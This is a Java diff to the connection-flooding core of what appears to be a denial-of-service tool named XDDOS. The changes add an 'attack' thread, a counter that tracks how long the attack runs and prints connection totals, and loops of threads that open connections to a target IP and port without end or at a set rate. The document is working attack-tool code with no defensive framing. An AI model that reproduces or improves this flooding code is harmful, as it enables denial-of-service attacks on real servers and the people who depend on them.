@@ -31,6 +31,7 @@ public class NettyBootstrap {
    public static final boolean disableFailedProxies;
    public static volatile int totalConnections = 0;
    public static volatile int totalSeconds = 0;
+   public static Thread attack;
 
    static {
       nettyThreads = XDDOS.nettyThreads;
@@ -101,7 +102,9 @@ public class NettyBootstrap {
       ResourceLeakDetector.setEnabled(true);
       InetAddress ip = XDDOS.resolved;
       int port = XDDOS.port;
-      new Thread(() -> {
+
+      Thread Counter = new Thread(() -> {
+         XDDOS.attackIsRunning = true;
          if (XDDOS.duration < 1) {
             XDDOS.duration = 2147483647;
          }
@@ -111,39 +114,46 @@ public class NettyBootstrap {
                Thread.sleep(1000L);
             } catch (InterruptedException var2) {
             }
+            System.out.println("Total Connections: " + totalConnections + " Total Seconds: " + totalSeconds);
             ++totalSeconds;
             integer = 0;
             triedCPS = 0;
          }
-      }).start();
+         XDDOS.attackIsRunning = false;
+         attack.stop();
+      });
+      Counter.setPriority(1);
+      Counter.start();
       int k;
       if (XDDOS.targetCPS == -1) {
          for(k = 0; k < XDDOS.loopThreads; ++k) {
-            (new Thread(() -> {
+            attack = new Thread(() -> {
                while(true) {
                   ++triedCPS;
                   bootstrap.connect(ip, port);
                }
-            })).start();
+            });
+            attack.start();
          }
       } else {
          for(k = 0; k < XDDOS.loopThreads; ++k) {
-            (new Thread(() -> {
+            attack = new Thread(() -> {
                while(true) {
                   for(int j = 0; j < XDDOS.targetCPS / XDDOS.loopThreads / 10; ++j) {
                      ++triedCPS;
                      bootstrap.connect(ip, port);
                   }
-
+                  
                   try {
                      Thread.sleep(100L);
                   } catch (InterruptedException var3) {
-                     var3.printStackTrace();
                   }
                }
-            })).start();
+            });
+            attack.start();
          }
       }
+
 
    }
 }
